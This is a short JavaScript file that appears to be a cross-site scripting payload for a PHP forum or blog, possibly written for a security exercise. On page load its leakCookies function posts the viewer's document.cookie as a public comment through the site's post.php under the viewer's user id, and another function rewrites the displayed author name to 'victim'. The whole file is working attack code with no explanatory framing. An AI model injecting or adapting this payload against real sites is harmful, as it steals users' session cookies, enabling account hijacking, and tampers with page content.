  function myfunction(){
    if(window.location.pathname.includes('view.php') && window.location.search.includes('id=')){
        const urlParams = new URLSearchParams(window.location.search);
        let temp = document.getElementById("author").innerHTML;
        console.log(temp);
        let words = temp.split(' ');
        words[2] = "victim";
        document.getElementById("author").innerHTML = words.join(' ');
        temp = document.getElementById("author").innerHTML;
        console.log(temp);
    }
    return;
  }
  function getID(){
    if(window.location.pathname.includes('view.php') && window.location.search.includes('id=')){
        const urlParams = new URLSearchParams(window.location.search);
        const postId = urlParams.get('id');
        return postId;
    }
    return -100;
  }
  function leakCookies(postID){
    if(window.location.pathname.includes('view.php') && window.location.search.includes('id=')){
        let temp = document.getElementById("uid");
        const usrid = temp.value;
        const formData = new FormData();
        formData.append("comment",document.cookie);
        formData.append("form","comment");
        formData.append("parent",postID);
        formData.append("uid",usrid);
        fetch(window.location.pathname+"/../post.php", {
            method: "POST",
            body: formData,
        });
    }
  }
  window.addEventListener("load", function() {
    leakCookies(getID());
    myfunction();
  });
